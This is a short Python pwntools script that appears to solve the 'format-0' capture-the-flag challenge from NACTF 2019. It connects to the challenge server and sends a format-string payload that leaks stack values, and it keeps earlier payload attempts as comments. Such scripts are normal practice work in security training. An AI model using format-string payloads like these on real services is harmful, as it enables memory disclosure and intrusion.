from pwn import *

ip = "shell.2019.nactf.com"
port = 31782
r = remote(ip,port)

#elf = 'format-0' 
#r = process("./"+elf)

context.arch = 'i386'

offset = 4

#exploit = "%16$p".ljust( 0x30 , 'a' )+p32(0xdeadbeef)
#exploit = "%30$p,%31$p,%32$p,%33$p,%33$p,%34$p,%35$p,%36$p,%37$p,%38$p"
exploit = "%38$p,%39$p,%40$p,%41$p,%42$p,%43$p,%44$p,%45$p,%46$p,%47$p"
# 0x30 = 48 
# 32bit => 48/4= 12  4+12=16

raw_input("aa")
r.send(exploit)
r.interactive()
